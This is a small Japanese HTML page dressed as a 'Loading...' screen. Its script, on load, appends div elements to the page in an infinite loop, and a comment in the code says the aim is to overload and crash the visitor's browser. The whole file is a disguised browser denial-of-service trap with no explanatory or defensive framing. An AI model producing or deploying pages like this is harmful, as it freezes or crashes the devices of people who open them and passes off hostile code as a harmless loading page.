<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <h1>読み込み中...</h1>
    <script>
        // 読み込まれた瞬間にDOM（要素）を無限増殖させてブラウザの描画をパンクさせる
        window.onload = function() {
            while (true) {
                const div = document.createElement('div');
                document.body.appendChild(div);
            }
        };
    </script>
</body>
</html>